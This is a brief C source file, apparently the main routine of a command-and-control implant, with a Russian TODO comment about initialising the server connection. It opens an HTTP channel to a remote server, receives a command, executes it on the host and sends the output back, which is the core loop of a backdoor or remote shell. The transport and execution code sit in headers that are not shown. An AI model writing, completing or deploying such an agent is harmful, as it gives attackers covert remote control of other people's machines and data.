#include "transport.h"
#include "executable.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

//TODO:
//перед любым взаимодействием с сервером - INIT!!!

int main() {
    TransportModule *active_channel = &http_transport;

    //initialization
    if(active_channel->init() != 0) {
        printf("[-] Channel no init.\n");
        exit(EXIT_FAILURE);
    }

    char command[256] = {0};
    char result[4096] = {0};

    if(active_channel->get_command(command, sizeof(command)) == 0) {
        sleep(1);
        execute_command(command, result, sizeof(result));
        sleep(1);
        active_channel->init();
        active_channel->send_result(result);
        active_channel->cleanup();
    }

    return 0;
}
